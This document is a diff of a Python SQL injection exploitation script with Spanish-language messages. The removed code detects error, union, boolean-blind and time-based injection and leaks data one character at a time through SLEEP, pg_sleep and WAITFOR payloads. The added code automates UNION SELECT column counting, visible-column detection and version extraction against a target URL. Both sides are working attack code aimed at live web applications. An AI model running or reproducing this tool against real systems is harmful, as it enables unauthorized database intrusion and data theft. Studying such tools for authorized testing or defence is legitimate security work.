@@ -1,185 +1,119 @@
 #!/usr/bin/env python3
-import argparse
 import requests
-import time
+import argparse
 from urllib.parse import quote_plus
 
-class SQLiScanner:
-    def __init__(self, url, request_file=None, output_file=None, dbms='mysql'):
-        self.url = url
-        self.request_file = request_file
-        self.output_file = output_file
-        self.session = requests.Session()
-        self.dbms = dbms.lower()
+# Colores
+GREEN = "\033[0;32m\033[1m"
+RED = "\033[0;31m\033[1m"
+BLUE = "\033[0;34m\033[1m"
+PINK = "\033[0;95m\033[1m"
+YELLOW = "\033[0;33m\033[1m"
+PURPLE = "\033[0;35m\033[1m"
+TURQUOISE = "\033[0;36m\033[1m"
+GRAY = "\033[0;37m\033[1m"
+ENDC = "\033[0m\033[0m"
 
-    def load_request(self):
-        if self.request_file:
-            with open(self.request_file, 'r') as f:
-                return f.read().strip()
-        return None
+class SQLiScanner:
+    def __init__(self, url, dbms='mysql', output_file=None, num_cols=None, visible_col=None):
+        self.url = url
+        self.dbms = dbms.lower()
+        self.output_file = output_file
+        self.num_cols = num_cols
+        self.visible_col = visible_col
+        self.session = requests.Session()
 
     def send_request(self, payload):
-        if self.request_file:
-            req_content = self.load_request()
-            if 'FUZZ' in req_content:
-                req = req_content.replace('FUZZ', payload)
-                lines = req.split('\n')
-                method = lines[0].split()[0]
-                url = self.url
-                headers = {}
-                data = None
+        try:
+            full_url = self.url + quote_plus(payload)
+            r = self.session.get(full_url, timeout=5)
+            return r.text
+        except requests.exceptions.RequestException:
+            return ""
 
-                for line in lines[1:]:
-                    if not line.strip():
-                        data = '\n'.join(lines[lines.index(line)+1:])
-                        break
-                    key, value = line.split(':', 1)
-                    headers[key.strip()] = value.strip()
+    def union_extract_version(self):
+        # Si no se proporcionan, intentar detectar columnas y columna visible
+        num_cols = self.num_cols or self.detect_columns_union()
+        if not num_cols:
+            return None
 
-                return self.session.request(method, url, headers=headers, data=data)
-            else:
-                raise ValueError("Request file must contain 'FUZZ' marker")
+        visible_col = self.visible_col or self.detect_visible_column(num_cols)
+        if not visible_col:
+            return None
+
+        # Construir payload según DBMS
+        if self.dbms == 'mysql' or self.dbms == 'mssql':
+            version_expr = "@@version"
+        elif self.dbms == 'postgres':
+            version_expr = "version()"
         else:
-            return self.session.get(f"{self.url}{payload}")
+            print("[-] DBMS no soportado para extracción UNION")
+            return None
 
-    def detect_injection_type(self):
-        tests = {
-            'error': "'"",
-            'union': "' ORDER BY 1-- -",
-            'boolean': "' AND 1=1-- -",
-            'time': "' AND SLEEP(5)-- -"
-        }
+        columns = ["NULL"] * num_cols
+        columns[visible_col-1] = version_expr
+        payload = f" UNION SELECT {','.join(columns)};-- -"
 
-        for inj_type, payload in tests.items():
-            try:
-                start = time.time()
-                response = self.send_request(quote_plus(payload))
-                elapsed = time.time() - start
+        response = self.send_request(payload)
+        return response.strip()
 
-                if inj_type == 'time' and elapsed >= 5:
-                    return 'time_based'
-                elif inj_type == 'error' and 'SQL syntax' in response.text:
-                    return 'error_based'
-                elif inj_type == 'boolean' and response.status_code == 200:
-                    return 'boolean_blind'
-                elif inj_type == 'union' and response.status_code == 200:
-                    return 'union_based'
-            except:
-                continue
+    # Funciones de detección automática (fallback)
+    def detect_columns_union(self, max_columns=10):
+        print("[*] Detecting number of columns for UNION SELECT...")
+        for i in range(1, max_columns+1):
+            payload = "' UNION SELECT " + ",".join(["NULL"]*i) + "-- -"
+            response = self.send_request(payload)
+            if "error" not in response.lower():
+                print(f"[+] Number of columns detected: {i}")
+                return i
+        print("[-] Could not detect number of columns.")
         return None
 
-    def build_query(self, base_query='version', pos=1, char=None, sleep=False):
-        if self.dbms == 'mysql':
-            if base_query == 'version':
-                return "@@version"
-            elif sleep:
-                return f"IF(SUBSTRING(({char}),{pos},1)='{char}',SLEEP(5),0)"
-            else:
-                return f"SUBSTRING(({char}),{pos},1)='{char}'"
+    def detect_visible_column(self, num_cols):
+        print("[*] Detecting visible column...")
+        for i in range(1, num_cols+1):
+            test_string = "TEST123"
+            columns = ["NULL"] * num_cols
+            columns[i-1] = f"'{test_string}'"
+            payload = f"' UNION SELECT {','.join(columns)}-- -"
+            response = self.send_request(payload)
+            if test_string in response:
+                print(f"[+] Visible column found at position: {i}")
+                return i
+        print("[-] No visible column detected.")
+        return None
 
-        elif self.dbms == 'postgres':
-            if base_query == 'version':
-                return "version()"
-            elif sleep:
-                return f"CASE WHEN SUBSTRING(({char}),{pos},1)='{char}' THEN pg_sleep(5) ELSE NULL END"
-            else:
-                return f"SUBSTRING(({char}),{pos},1)='{char}'"
+    def output(self, text):
+        print(text)
+        if self.output_file:
+            with open(self.output_file, 'a') as f:
+                f.write(text + '\n')
 
-        elif self.dbms == 'mssql':
-            if base_query == 'version':
-                return "@@version"
-            elif sleep:
-                return f"IF(SUBSTRING(({char}),{pos},1)='{char}') WAITFOR DELAY '0:0:5'"
-            else:
-                return f"SUBSTRING(({char}),{pos},1)='{char}'"
-
-        return base_query
-
-    def exploit_union(self, query):
-        version_query = self.build_query(base_query='version')
-        payload = f"' UNION ALL SELECT {version_query},NULL,NULL-- -"
-        response = self.send_request(quote_plus(payload))
-        return response.text
-
-    def exploit_blind(self, query):
-        result = ""
-        chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_:,.- "
-
-        for i in range(1, 50):
-            found = False
-            for char in chars:
-                condition = self.build_query(base_query=None, pos=i, char=query, sleep=False)
-                payload = f"' AND {condition}-- -"
-                response = self.send_request(quote_plus(payload))
-                if "true_condition" in response.text:
-                    result += char
-                    found = True
-                    break
-            if not found:
-                break
-        return result
-
-    def exploit_time(self, query):
-        result = ""
-        chars = "0123456789abcdefghijklmnopqrstuvwxyz_:.- "
-
-        for i in range(1, 20):
-            found = False
-            for char in chars:
-                condition = self.build_query(base_query=None, pos=i, char=query, sleep=True)
-                payload = f"' AND {condition}-- -"
-                start = time.time()
-                self.send_request(quote_plus(payload))
-                elapsed = time.time() - start
-
-                if elapsed >= 5:
-                    result += char
-                    found = True
-                    break
-            if not found:
-                break
-        return result
-
-    def run(self, options):
-        inj_type = options.type or self.detect_injection_type()
-
-        if not inj_type:
-            print("[-] Injection type not detected")
+    def run(self, technique):
+        if technique != "union":
+            self.output("[-] Solo se puede usar union en esta version.")
             return
 
-        print(f"[+] Using {inj_type} exploitation against {self.dbms.upper()}")
-
-        query = self.build_query(base_query='version')
-
-        if inj_type == 'union_based':
-            result = self.exploit_union(query)
-        elif inj_type == 'boolean_blind':
-            result = self.exploit_blind(query)
-        elif inj_type == 'time_based':
-            result = self.exploit_time(query)
-
-        self.output(f"[+] Database version: {result}", options)
-
-    def output(self, data, options):
-        print(data)
-        if options.output:
-            with open(options.output, 'a') as f:
-                f.write(data + '\n')
+        self.output(f"{YELLOW}[+]{ENDC} Corriendo extracción UNION-based {BLUE}{self.dbms.upper()}{ENDC}")
+        version = self.union_extract_version()
+        if version:
+            self.output(f"{YELLOW}[+]{ENDC} Version de base de datos:{BLUE}{version}{ENDC}")
+        else:
+            self.output("[-] Extracción fallida.")
 
 def main():
-    parser = argparse.ArgumentParser(description='SQL Injection Exploitation Tool')
-    parser.add_argument('-u', '--url', required=True, help='Target URL')
-    parser.add_argument('-r', '--request', help='File with HTTP request')
-    parser.add_argument('-o', '--output', help='Output file')
-    parser.add_argument('-t', '--type', choices=['union', 'error', 'boolean', 'time'], 
-                        help='Force injection type')
-    parser.add_argument('--dbms', choices=['mysql', 'postgres', 'mssql'], default='mysql',
-                        help='Specify the DBMS type (default: mysql)')
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", required=True, help="URL objetivo con el parametro vulnerable")
+    parser.add_argument("-t", "--technique", choices=["union"], default="union", help="Técnica de inyección")
+    parser.add_argument("--dbms", choices=["mysql","postgres","mssql"], default="mysql", help="Manejador de base de datos")
+    parser.add_argument("-o", "--output", help="Guardar en un archivo")
+    parser.add_argument("--columns", type=int, help="Número de columnas en el query")
+    parser.add_argument("--visible", type=int, help="Numero de columna visible")
 
     args = parser.parse_args()
 
-    scanner = SQLiScanner(args.url, args.request, args.output, args.dbms)
-    scanner.run(args)
+    scanner = SQLiScanner(args.url, args.dbms, args.output, args.columns, args.visible)
+    scanner.run(args.technique)
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
